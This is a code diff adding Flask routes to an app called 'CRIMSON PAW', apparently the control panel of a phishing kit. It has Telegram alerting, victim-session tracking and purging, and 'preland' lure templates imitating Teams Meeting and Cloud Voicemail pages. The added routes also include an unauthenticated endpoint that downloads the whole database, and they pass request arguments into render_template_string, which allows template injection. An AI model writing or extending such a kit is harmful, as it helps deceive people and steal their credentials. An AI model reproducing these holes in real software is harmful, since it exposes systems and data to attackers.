+        "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    wh_md = f"🐾 **CRIMSON PAW | {title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{message}\n🕒 `{now_str}`"
+    _send_raw_alert(tg_html, wh_md, is_prt=is_prt)
+
+
+@app.route('/api/backup/export', methods=['GET'])
+def export_database_backup():
+    from flask import send_file
+    if os.path.exists(Config.DB_PATH):
+        return send_file(Config.DB_PATH, as_attachment=True, download_name='crimson_paw_backup.db')
+    return jsonify({'error': 'Database file not found'}), 404
+
+@app.route('/api/sessions/purge-expired', methods=['POST'])
+def purge_expired_sessions():
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        cur = conn.cursor()
+        cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED')")
+        purged = cur.rowcount
+        conn.commit()
+        conn.close()
+        return jsonify({'success': True, 'purged': purged})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/sessions/purge-inactive', methods=['POST'])
+def purge_inactive_sessions_route():
+    try:
+        deleted = db.purge_inactive_sessions()
+        return jsonify({'success': True, 'deleted': deleted})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+# ── Sandbox Templates Studio Routes ─────────────────────────────────────────
+import sandbox_templates
+
+@app.route('/sandbox/templates', methods=['GET'])
+def sandbox_templates_studio():
+    return render_template_string(sandbox_templates.render_sandbox_studio_page())
+
+@app.route('/sandbox/templates/<template_key>/<stage>', methods=['GET'])
+def sandbox_standalone_page(template_key, stage):
+    cfg_overrides = dict(request.args)
+    html = sandbox_templates.render_sandbox_preview(template_key, stage, cfg_overrides)
+    return render_template_string(html)
+
+@app.route('/sandbox/render', methods=['GET', 'POST'])
+def sandbox_dynamic_render():
+    if request.method == 'POST':
+        data = request.get_json() or {}
+        tmpl = data.get('template', 'meeting')
+        stage = data.get('stage', 'preland')
+        overrides = data.get('config', {})
+    else:
+        tmpl = request.args.get('template', 'meeting')
+        stage = request.args.get('stage', 'preland')
+        overrides = dict(request.args)
+    html = sandbox_templates.render_sandbox_preview(tmpl, stage, overrides)
+    return render_template_string(html)
+
+@app.route('/sandbox/api/info', methods=['GET'])
+def sandbox_templates_info():
+    return jsonify({
+        'templates': [
+            {'key': 'meeting', 'name': 'Teams Meeting', 'category': 'Collaboration & Video', 'accent': '#5B5FC7'},
+            {'key': 'voicemail', 'name': 'Cloud Voicemail', 'category': 'Unified Voice & Audio', 'accent': '#0078D4'}
+        ]
+    })
+
+
+if __name__ == '__main__':
+
+    db.init_db()
+    logger.info(f"Starting CRIMSON PAW on http://{Config.WEB_HOST}:{Config.WEB_PORT}")
+    app.run(host=Config.WEB_HOST, port=Config.WEB_PORT, debug=False)
